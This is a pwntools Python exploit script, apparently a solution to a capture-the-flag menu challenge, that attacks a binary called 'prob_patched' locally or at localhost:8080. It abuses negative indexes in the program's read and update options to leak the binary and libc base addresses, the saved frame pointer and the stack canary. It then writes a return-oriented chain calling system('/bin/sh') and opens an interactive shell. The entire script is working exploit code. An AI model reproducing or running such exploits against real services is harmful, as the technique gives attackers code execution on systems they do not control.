#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'prob_patched'
HOST = 'localhost'
PORT = 8080

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1352
brva 0x13c3
brva 0x1656
brva 0x1545
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(size, data):
    sla(b'> ', b'1')
    sla(b'size: ', str(size).encode())
    sa(b'data: ', data)
def read(idx):
    sla(b'> ', b'2')
    sla(b'index: ', str(idx).encode())
    return p.recv(0x100)
def update(idx, size, data):
    sla(b'> ', b'3')
    sla(b'index: ', str(idx).encode())
    sla(b'size: ', str(size).encode())
    sa(b'data: ', data)
def delete(idx):
    sla(b'> ', b'4')
    sla(b'index: ', str(idx).encode())

# slots <= 9
# size <= 0x28

leak = read(-3)[0x8:0x70]
exe.address = u64(leak[:8]) - 0x2063
libc.address = u64(leak[8:16]) - 0x2045c0
srbp = u64(leak[16:24])
canary = u64(leak[0x58:0x60])
log.info(f'binary_leak: {hex(exe.address)}')
log.info(f'saved rbp: {hex(srbp)}')
log.info(f'libc_leak: {hex(libc.address)}')
log.info(f'canary: {hex(canary)}')

pop_rdi = 0x000000000010f75b + libc.address
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
ret = 0x000000000000101a + exe.address

# update(-1, 0x28, b'A'*0x8 + p64(canary) + p64(srbp) + p64(pop_rdi) + p64(binsh) + p64(system))
create(0x28, b'A'*0x28)
update(-1537228672809129302, 0x28, p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

p.interactive()

